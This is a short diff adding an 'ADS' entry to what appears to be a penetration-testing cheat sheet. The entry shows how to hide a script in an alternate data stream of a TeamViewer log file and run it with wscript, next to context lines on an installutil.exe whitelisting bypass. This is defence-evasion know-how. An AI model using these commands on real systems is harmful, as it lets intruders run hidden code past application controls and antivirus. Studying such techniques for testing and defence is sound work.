@@ -50,6 +50,12 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogTo
 copy Bypass.exe C:\Windows\Tasks
 C:\Windows\Tasks\Bypass.exe 
 ```
+## ADS
+file must be both writable and executable
+```
+type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
+wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
+```
 # AV
 ## Find signature
 ```
